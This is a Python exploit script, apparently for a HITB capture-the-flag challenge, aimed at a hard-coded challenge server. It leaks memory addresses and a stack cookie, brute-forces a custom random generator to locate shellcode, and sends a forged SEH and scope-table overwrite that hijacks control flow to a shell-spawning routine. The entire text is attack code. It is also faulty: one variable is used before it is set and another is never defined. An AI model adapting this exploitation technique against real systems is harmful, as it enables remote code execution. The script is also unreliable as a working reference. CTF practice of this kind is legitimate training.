import socket
import time
import struct

#hitb{y0u_4r3_th3_3xp3rt_0f_3xc3pti0n_handling}

CONN_ADDR = ('47.88.217.238', 20003)
SLEEP_TIME = 0.3
FAST_SLEEP_TIME = 0.05
RECV_AMOUNT = 4096

state_dword = 0
rand_1 = 0
rand_2 = 0
rand_3 = 0
def weird_algo(array):
    global state_dword, rand_1, rand_2, rand_3
    dx = state_dword
    ax = (dx + 3) & 0x1f
    bx = (dx - 1) & 0x1f
    ax = array[ax]
    si = ax
    di = array[bx]
    si = (si >> 8)
    si = si ^ array[dx]
    si = si ^ ax
    rand_1 = di
    ax = (dx - 8) & 0x1f
    rand_2 = si
    cx = array[ax]
    ax = (dx + 10) & 0x1f
    dx = cx
    dx = (cx << 5) % (2 ** 32)
    ax = array[ax]
    dx = dx ^ ax
    dx = (dx << 14) % (2 ** 32)
    dx = dx ^ ax
    dx = dx ^ cx
    cx = state_dword
    ax = dx
    rand_3 = dx
    ax = ax ^ si
    array[cx] = ax
    ax = (dx * 4) % (2 ** 32)
    ax = ax ^ di
    ax = (ax << 4) % (2 ** 32)
    ax = ax ^ si
    ax = (ax << 7) % (2 ** 32)
    ax = ax ^ dx
    ax = ax ^ si
    ax = ax ^ di
    array[bx] = ax
    ax = (cx - 1) & 0x1f
    state_dword = ax
    return array[ax]
    
def one_of_list_in(lst, dat):
    return (True in [z in dat for z in lst])

def recv_until_either(s, tr_list):
    all_data = ''
    in_data = s.recv(RECV_AMOUNT)
    while not one_of_list_in(tr_list, in_data):
        all_data += in_data
        in_data = s.recv(RECV_AMOUNT)
    all_data += in_data
    return all_data
    
def recv_until(s, tr):
    all_data = ''
    in_data = s.recv(RECV_AMOUNT)
    while tr not in in_data:
        all_data += in_data
        in_data = s.recv(RECV_AMOUNT)
    all_data += in_data
    return all_data
    
def send_string(s, wstr):
    s.sendall(wstr)
    time.sleep(SLEEP_TIME)
    
def send_int(s, choice):
    s.sendall(str(choice))
    time.sleep(SLEEP_TIME)
    
def send_int_fast(s, choice):
    s.sendall(str(choice))
    time.sleep(FAST_SLEEP_TIME)

def are_arrays_the_same(arr_1, arr_2):
    return sorted(arr_1) == sorted(arr_2)
 
def main():
    global state_dword, rand_1, rand_2, rand_3 
    
    CREATE = '1\n'
    LIST = '2\n' 
    DELETE = '3\n'
    RUN = '4\n'
    SET_GUARD = '5\n'
    EXIT = '0\n'
    
    s = socket.socket()
    s.connect(CONN_ADDR)
    
    # leak on connect
    print "First leak - allocsc, on connect"
    first_leak = recv_until(s, 'name')
    allocsc_addr = first_leak.split('at ')[1].split('\n')[0].strip()
    print allocsc_addr
    
    # name leak
    print "Second leak - through name, the main and la stack"
    eb_input = 'p' * (0x18 - 4)
    send_string(s, eb_input + '\n')
    
    # shellcode guard leak
    init_scmgr_addr = 0
    send_string(s, SET_GUARD)
    send_string(s, '1\n')
    send_string(s, 'k\n')
    second_leak = recv_until(s, 'wrong!')
    
    leaked_addrs = second_leak.split(eb_input)[1].split('\r\n')[0]
    print repr(leaked_addrs)

    leaked_main_addr = struct.unpack('<I', leaked_addrs[8:] + '\x00')[0]
    leaked_stack_addr = struct.unpack('<I', leaked_addrs[4:8])[0]
    leaked_cookied_stuff = struct.unpack('<I', leaked_addrs[:4])[0]
    print "main addr:"
    print hex(leaked_main_addr)
    print "stack addr:"
    print hex(leaked_stack_addr)
    print "cookied stuff:"
    print hex(leaked_cookied_stuff)
    
    print "Third leak - init_scmgr, on shellcode guard setup"
    leaked_addrs = second_leak.split('code is ')[1].split('\n')[0].strip()
    real_array = [int('0x' + s_addr, 16) for s_addr in leaked_addrs.split('-')]
    print real_array
    for addr in range(2 ** 16):
        state_dword = 0
        full_addr = addr * (2 ** 16) + 0x1090
        addr_array = []
        our_array = []
        input_addr = full_addr
        for i in range(32):
            addr_array.append(input_addr)
            input_addr = (input_addr * 0x10dcd) % (2 ** 32)
        for i in range(6):
            z = weird_algo(addr_array)
            our_array.append(z)
        if are_arrays_the_same(our_array, real_array):
            print 'FOUND'
            print hex(full_addr)
            init_scmgr_addr = full_addr
    
    main_ebp = leaked_stack_addr - 72
    rs_ebp = main_ebp - 52
    next_seh_record = main_ebp + 0x38
    rs_old_esp = rs_ebp - 144
    
    print 'main_base, cookie, getshell_addr'
    main_base = leaked_main_addr & 0xFFFF0000
    cookie = leaked_cookied_stuff ^ main_ebp
    getshell_addr = init_scmgr_addr + 0x100 - 0x90
    print [hex(z) for z in [main_base, cookie, getshell_addr]]
    
    print 'rs_cookie, cookie_scope_table, handler'
    rs_cookie = cookie ^ rs_ebp
    # cookie_scope_table = (main_base + 0x3960) ^ cookie
    handler = (main_base + 0x18a0)
    print hex(rs_cookie), hex(cookie_scope_table), hex(handler)
    
    allocsc_addr = int('0x' + allocsc_addr,16)
    cookie_scope_table = allocsc_addr ^ cookie
    # offset = (allocsc_addr - (main_base + 0x53f8)) / 4
        
    overwrite_value = 'p' * (0x80 - 0x1c) + struct.pack('<I', rs_cookie)
    overwrite_value += struct.pack('<I', rs_old_esp) + struct.pack('<I', 1) # old esp, ex_something
    overwrite_value += struct.pack('<I', next_seh_record) # next
    overwrite_value += struct.pack('<I', handler) # handler
    overwrite_value += struct.pack('<I', cookie_scope_table) # cookied scope 
    overwrite_value += struct.pack('<I', 0) # Try level
    overwrite_value +=  struct.pack('<I', main_ebp) + struct.pack('<I', getshell_addr)
    overwrite_size = len(overwrite_value)
    print 'size'
    print overwrite_size
    
    scope = struct.pack('<IIIIIII', 0xffffffe4, 0x0, 0xffffff70, 0x0, 0xfffffffe, main_base + 0x142a, getshell_addr)
    scope_len = len(scope_shit)
    
    # creation
    print 'create'
    send_string(s, CREATE)
    print s.recv(2048)
    send_string(s, str(scope_len) + '\n')
    print s.recv(2048)
    send_string(s, 'k\n')
    print s.recv(2048)
    send_string(s, 'k\n')
    print s.recv(2048)
    send_string(s, scope + '\n')
    print s.recv(2048)
    
    print 'create 2'
    send_string(s, CREATE)
    print s.recv(2048)
    send_string(s, str(overwrite_size) + '\n')
    print s.recv(2048)
    send_string(s, 'k\n')
    print s.recv(2048)
    send_string(s, 'k\n')
    print s.recv(2048)
    send_string(s, overwrite_value + '\n')
    print s.recv(2048)
    
    print 'run'
    send_string(s, RUN)
    send_string(s, '1\n')
    send_string(s, 'type flag\n' * 200)
    print s.recv(4096)
    print s.recv(4096)
    # print s.recv(4096)
    
main()
